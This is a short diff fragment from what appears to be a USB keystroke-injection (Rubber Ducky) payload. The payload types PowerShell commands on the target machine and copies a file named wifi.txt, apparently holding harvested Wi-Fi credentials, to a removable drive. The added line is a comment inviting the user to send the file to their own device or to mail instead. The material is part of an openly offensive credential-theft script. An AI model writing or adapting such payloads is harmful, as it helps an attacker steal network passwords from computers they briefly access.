@@ -41,6 +41,7 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 2000
+REM You may change the below code to cop/ transfer the text file to your device/ mail etc
 STRING Copy-Item -Path "C:\wifi\wifi.txt" -Destination "E:\" -Force
 DELAY 200 
 ENTER
